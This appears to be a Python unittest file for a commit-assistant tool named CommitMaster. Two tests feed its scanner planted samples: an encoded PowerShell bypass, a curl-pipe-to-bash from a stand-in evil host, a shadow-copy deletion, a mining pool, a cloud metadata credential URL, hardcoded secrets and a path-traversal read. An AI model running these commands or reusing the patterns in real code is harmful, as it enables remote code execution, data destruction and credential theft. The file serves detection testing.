import os
import sys
import unittest

APP_DIR = os.path.dirname(os.path.abspath(__file__))
if APP_DIR not in sys.path:
    sys.path.insert(0, APP_DIR)

from commitmaster import ai_messages, commit_engine, file_inspector, issue_view, ui


class TestEnhancements(unittest.TestCase):
    def test_new_features_subsection_in_comment(self):
        facts = {
            "new_syms": [("class", "Autoscroller"), ("def", "__init__"), ("def", "on_press"), ("def", "_find_scroll_target")],
            "touched": ["_tick"],
            "added": 28,
            "removed": 9,
        }
        res = ai_messages._heuristic_message("commitmaster/navigation.py", "M", facts)
        
        # Verify conventional commit headline highlights class, not __init__
        self.assertTrue(res["summary"].startswith("feat(navigation):"))
        self.assertIn("Autoscroller", res["summary"])
        self.assertNotIn("__init__", res["summary"])
        
        # Verify New Features subsection is prominently created
        self.assertIn("### New Features", res["description"])
        self.assertTrue("- Adds class `Autoscroller`" in res["description"] or '- Adds class "Autoscroller"' in res["description"])
        self.assertTrue("- Adds function `on_press`" in res["description"] or '- Adds function "on_press"' in res["description"])
        
        # Verify Changes & Improvements subsection
        self.assertIn("### Changes & Improvements", res["description"])
        self.assertTrue("- Updates logic in `_tick`" in res["description"] or '- Updates logic in "_tick"' in res["description"])

    def test_refactor_changes_subsection_without_new_features(self):
        facts = {
            "new_syms": [],
            "touched": ["inspect_file"],
            "added": 2,
            "removed": 1,
        }
        res = ai_messages._heuristic_message("commitmaster/file_inspector.py", "M", facts)
        
        self.assertTrue(res["summary"].startswith("refactor(file_inspector):"))
        self.assertNotIn("### New Features", res["description"])
        self.assertIn("### Changes & Improvements", res["description"])
        self.assertTrue("- Updates logic in `inspect_file`" in res["description"] or '- Updates logic in "inspect_file"' in res["description"])

    def test_clean_description_preserves_subsections(self):
        raw = "### New Features\n- Adds Autoscroller\n\n### Changes & Improvements\n- Updates logic"
        cleaned = ai_messages._clean_description(raw, "navigation.py", [])
        self.assertIn("### New Features", cleaned)
        self.assertIn("- Adds Autoscroller", cleaned)
        self.assertIn("### Changes & Improvements", cleaned)
        self.assertIn("- Updates logic", cleaned)

    def test_subprocess_kwargs_hides_console_on_windows(self):
        flags = commit_engine._subprocess_kwargs()
        if os.name == "nt":
            self.assertIn("creationflags", flags)
            self.assertEqual(flags["creationflags"], 0x08000000)
            self.assertIn("startupinfo", flags)
            self.assertEqual(flags["startupinfo"].wShowWindow, 0)

    def test_format_vulnerability_audit_log(self):
        issues = {
            "config.py": [{
                "severity": "security",
                "title": "Hardcoded AWS Access Key",
                "line": 15,
                "reference": "CWE-798",
                "category": "SECURITY BREACH",
                "context": [{"line": 15, "hit": True, "text": "AWS_KEY = AKIAEXAMPLE"}],
                "explanation": "Hardcoded credentials present in source file.",
                "fix": "Store key in environment variable.",
                "hardening": "• Store keys in AWS Secrets Manager.\n• Enforce pre-commit scanning.",
            }]
        }
        report = file_inspector.format_issue_report(issues, "CommitMaster")
        self.assertIn("COMMITMASTER PRE-COMMIT HEALTH & VULNERABILITY AUDIT REPORT", report)
        self.assertIn("[FILE: config.py]", report)
        self.assertIn("[SECURITY] Hardcoded AWS Access Key (Line 15) [CWE-798]", report)
        self.assertIn("Why it matters: Hardcoded credentials present in source file.", report)
        self.assertIn("Recommended Fix: Store key in environment variable.", report)
        self.assertIn("Project Hardening: • Store keys in AWS Secrets Manager.", report)

    def test_virus_malware_detection(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            malware_code = (
                "# Suspicious loader\n"
                "powershell.exe -ExecutionPolicy Bypass -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==\n"
                "curl -sSL https://evil.example.com/payload.sh | bash\n"
                "vssadmin delete shadows /all /quiet\n"
                "POOL = 'stratum+tcp://pool.monero.org:3333'\n"
            )
            filepath = os.path.join(tmpdir, "trojan.py")
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(malware_code)

            issues = file_inspector.inspect_file(tmpdir, "trojan.py")
            titles = [i["title"] for i in issues]
            categories = [i.get("category") for i in issues]
            threat_classes = [i.get("threat_class") for i in issues]

            self.assertTrue(any("PowerShell Payload" in t for t in titles))
            self.assertTrue(any("Download-and-Execute" in t for t in titles))
            self.assertTrue(any("Ransomware" in t for t in titles))
            self.assertTrue(any("Cryptocurrency" in t for t in titles))
            self.assertIn("VIRUS / MALWARE THREAT", categories)
            self.assertIn("virus_threat", threat_classes)

            # Check detailed explanations and hardening suggestions are present
            ps_issue = next(i for i in issues if "PowerShell Payload" in i["title"])
            self.assertTrue(len(ps_issue["explanation"]) > 30)
            self.assertTrue(len(ps_issue["fix"]) > 20)
            self.assertIn("hardening", ps_issue)
            self.assertTrue(len(ps_issue["hardening"]) > 30)

    def test_exploit_vector_and_breach_detection(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            exploit_code = (
                "# Exploit vectors and breaches\n"
                "METADATA_URL = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n"
                "DB_CONN = 'postgresql://admin:superSecretPass123@prod-db.internal:5432/corp'\n"
                "JWT_SECRET = 'SuperSecretTokenKey12345'\n"
                "def get_user_file(filename):\n"
                "    return open(os.path.join(SAFE_DIR, filename), 'r').read()\n"
            )
            filepath = os.path.join(tmpdir, "routes.py")
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(exploit_code)

            issues = file_inspector.inspect_file(tmpdir, "routes.py")
            titles = [i["title"] for i in issues]
            categories = [i.get("category") for i in issues]

            self.assertTrue(any("Cloud Instance Metadata SSRF" in t for t in titles))
            self.assertTrue(any("Database Connection URI" in t for t in titles))
            self.assertTrue(any("JWT" in t for t in titles))
            self.assertTrue(any("Path Traversal" in t for t in titles))
            self.assertIn("HACKER EXPLOIT VECTOR", categories)
            self.assertIn("SECURITY BREACH", categories)

    def test_windows_shortcut_single_quote_escape(self):
        from commitmaster.windows_integration import _ps_escape
        raw = "CommitMaster Admin Portal - Saumya's Private Workspace"
        escaped = _ps_escape(raw)
        self.assertEqual(escaped, "CommitMaster Admin Portal - Saumya''s Private Workspace")

    def test_ai_status_display(self):
        status_text, is_ready = ai_messages.get_ai_status_display()
        self.assertTrue(is_ready)
        self.assertIn("Gemini", status_text)
        self.assertNotIn("Local AI: Ready", status_text)

    def test_reminder_debounce_closed_under_two_minutes(self):
        import time
        from commitmaster.reminder_service import ReminderService
        rs = ReminderService(user_id=1)
        now = time.time()
        # Session opened 45 seconds ago (accidental launch) -> Should NOT notify
        self.assertFalse(rs._should_notify_for_ended_session("Code.exe", now - 45))
        # Session opened 5 minutes ago (300s) -> Should notify
        self.assertTrue(rs._should_notify_for_ended_session("Code.exe", now - 300))


if __name__ == "__main__":
    unittest.main()
